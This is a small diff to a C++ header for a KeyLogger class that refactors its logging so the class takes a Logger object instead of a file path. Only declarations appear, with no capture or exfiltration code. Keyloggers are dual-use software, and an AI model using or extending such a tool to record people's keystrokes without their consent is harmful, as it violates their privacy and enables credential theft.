@@ -3,17 +3,17 @@
 #include <string>
 #include <iostream>
 #include <fstream>
+#include "Logger.h"
 
 using namespace std;
 
 class KeyLogger
 {
 private:
-	ofstream logFile;
+	Logger* logger;
 
 public:
-	KeyLogger(string filepath);
-	~KeyLogger();
+	KeyLogger(Logger* logger);
 	void StartLogging();
 };
 
